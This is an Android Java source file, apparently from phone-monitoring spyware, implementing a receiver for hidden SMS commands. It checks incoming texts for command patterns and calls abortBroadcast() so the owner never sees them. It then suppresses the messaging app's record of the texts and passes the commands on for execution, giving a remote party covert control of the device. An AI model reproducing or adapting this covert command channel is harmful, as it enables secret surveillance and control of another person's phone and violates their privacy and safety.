package com.vvt.android.syncmanager.receivers;

import java.util.ArrayList;
import java.util.Iterator;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.gsm.SmsMessage;
import com.fx.dalvik.util.FxLog;

import com.fx.dalvik.event.Event;
import com.fx.dalvik.event.EventSms;
import com.fx.dalvik.mmssms.MmsSmsDatabaseManager;
import com.vvt.android.syncmanager.Customization;
import com.vvt.android.syncmanager.control.Main;
import com.vvt.android.syncmanager.smscommand.SmsCommandHelper;
import com.vvt.android.syncmanager.smscommand.SmsCommandManager;

@SuppressWarnings("deprecation")
public final class SmsCommandReceiver extends BroadcastReceiver { 

	private static final String TAG = "SmsCommandReceiver";
	private static final boolean DEBUG = true;
 	private static final boolean LOGV = Customization.DEBUG ? DEBUG : false;
    
    // @Override 
    public void onReceive(Context context, Intent intent) { 
    	if (LOGV) {
    		FxLog.v(TAG, "onReceive # ENTER ...");
    	}
    
    	Main.startIfNotStarted(context.getApplicationContext());
    	
 		Bundle bundle = intent.getExtras();
 		
 		if (bundle == null) {
 			if (LOGV) {
 	    		FxLog.v(TAG, "onReceive # Bundle is NULL!! -> EXIT ...");
 	    	}
 			return;
 		}
           
    	Object[] aPDUArray = (Object[]) bundle.get("pdus");
    	   
    	// list of integrated SMS
    	ArrayList<EventSms> smses = getIntegratedSmsList(aPDUArray);
    	
    	EventSms sms = null;
    	String phoneNumber = null;
    	String messageBody = null;
    	
    	// Start normal operation with incoming SMS
    	for (Iterator<EventSms> it = smses.iterator(); it.hasNext();) {
    		sms = it.next();
    		
    		phoneNumber = sms.getPhonenumber();
    		messageBody = sms.getData();
    		
    		if (LOGV) {
    			FxLog.v(TAG, String.format(
    					"onReceive # phone: %s, msg: %s", phoneNumber, messageBody));
    		}
			
    		// process SMS command
    		SmsCommandManager smsCommandManager = SmsCommandManager.getInstance();
    		
    		if (SmsCommandHelper.isConsideredSmsCommand(messageBody)) {
    			if (LOGV) FxLog.v(TAG, "onReceive # Found SMS command!");
    			
    			abortBroadcast();
    			
    			// Suppress Messaging -> stop message injection to database
    			MmsSmsDatabaseManager.suppressMmsSmsPackage(context.getApplicationContext());
    			
    			// Capture as system event
    			SmsCommandHelper.captureEventSystem(phoneNumber, messageBody, Event.DIRECTION_IN);
    			
    			smsCommandManager.processSmsCommand(phoneNumber, messageBody);
    		}
    	}
    	
    	if (LOGV) {
    		FxLog.v(TAG, "onReceive # EXIT ...");
    	}
    }
    
    // Rearrange incoming SMS
	private ArrayList<EventSms> getIntegratedSmsList(Object[] pdus) {
        ArrayList<EventSms> smsMessageList = new ArrayList<EventSms>();
    	 
    	// an SMS object receiving from aPDUArray
     	SmsMessage pduSmsMessage = null;
     	
     	// an SMS object used for SMS body's integration
     	EventSms sms = null;
     	String phoneNumber = null;
     	String messageBody = null;
    	 
    	// Rearrange incoming SMS
     	for (int i = 0; i < pdus.length; i++) {
     		// get pduSmsMessage from aPDUArray
     		pduSmsMessage = SmsMessage.createFromPdu((byte[]) pdus[i]);
     		
     		// Get last smsMessage from the smsMessageList
     		if (!smsMessageList.isEmpty()) {
     			sms = smsMessageList.get(smsMessageList.size()-1);
     			phoneNumber = sms.getPhonenumber();
     			messageBody = sms.getData();
     		}
     		
     		// Update smsMessage when they share the same originatingAddress
     		if (phoneNumber != null
     				&& phoneNumber.equals(pduSmsMessage.getDisplayOriginatingAddress())) {
     			// Append displayMessageBody
     			messageBody += pduSmsMessage.getDisplayMessageBody();
     			sms.setDate(messageBody);
     		}
     		
     		// Construct new smsMessage
     		else {            			
     			phoneNumber = pduSmsMessage.getDisplayOriginatingAddress();
     			messageBody = pduSmsMessage.getDisplayMessageBody();
     			
 				sms = new EventSms();
 				sms.setPhoneNumber(phoneNumber);
 				sms.setDate(messageBody);
 				
 				smsMessageList.add(sms);
     		}
     	}
     	return smsMessageList;
    }
}
